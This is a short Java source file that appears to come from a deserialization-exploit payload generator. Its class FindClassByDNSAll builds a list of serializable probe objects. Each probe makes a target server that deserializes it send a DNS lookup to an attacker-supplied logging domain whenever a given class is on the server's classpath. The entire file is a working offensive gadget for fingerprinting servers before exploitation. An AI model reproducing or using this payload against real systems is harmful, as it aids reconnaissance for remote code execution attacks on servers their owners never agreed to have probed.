package com.xyuxu.javasec.core.payload.gadgets;

import com.xyuxu.javasec.utils.ProbeUtil;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;

public class FindClassByDNSAll implements ObjectPayload {

    @Override
    public Object getObject(String command) throws Exception {

        String dnsLogDomain = command.trim();
        List<Object> probeList = new LinkedList<>();

        for (Map.Entry<String, String> entry : ProbeUtil.PROBE_MAP.entrySet()) {
            String prefix = entry.getKey();
            String className = entry.getValue();

            String fullUrl = "http://" + prefix + "." + dnsLogDomain;

            HashMap<?, ?> probeItem = ProbeUtil.makeDNSProbeMap(fullUrl, className);

            if (probeItem != null) {
                probeList.add(probeItem);
            }
        }

        return probeList;
    }
}